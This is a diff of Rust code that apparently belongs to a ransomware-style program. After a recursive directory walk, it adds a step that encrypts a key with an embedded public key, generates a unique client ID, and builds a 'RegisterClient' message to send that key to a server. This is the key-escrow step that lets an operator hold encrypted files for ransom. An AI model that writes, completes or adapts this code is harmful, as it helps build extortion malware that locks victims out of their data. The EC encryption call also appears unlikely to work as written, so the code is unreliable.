@@ -1,4 +1,6 @@
+use comms::generate_ucid;
 use filesystem::recurse_directory_with_channel;
+use openssl::ec;
 use std::path::PathBuf;
 use std::vec::Vec;
 
@@ -38,7 +40,19 @@ async fn main() {
     for thread in threads {
         let _ = thread.await;
     }
-    // encrypt key here
+
+    let ecc_key = ec::EcKey::public_key_from_pem(PUB_KEY).unwrap();
+    let p_key = openssl::pkey::PKey::from_ec_key(ecc_key).unwrap();
+    let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
+    let buffer_len = encryptor.encrypt_len(&key).unwrap();
+    let mut encrypted = vec![0u8; buffer_len];
+
+    // Encrypt the data and discard its length
+    let _ = encryptor.encrypt(&key, &mut encrypted).unwrap();
+
+    let ucid = generate_ucid().unwrap();
+
+    let register_blob = comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
 
     // send key to server here
 
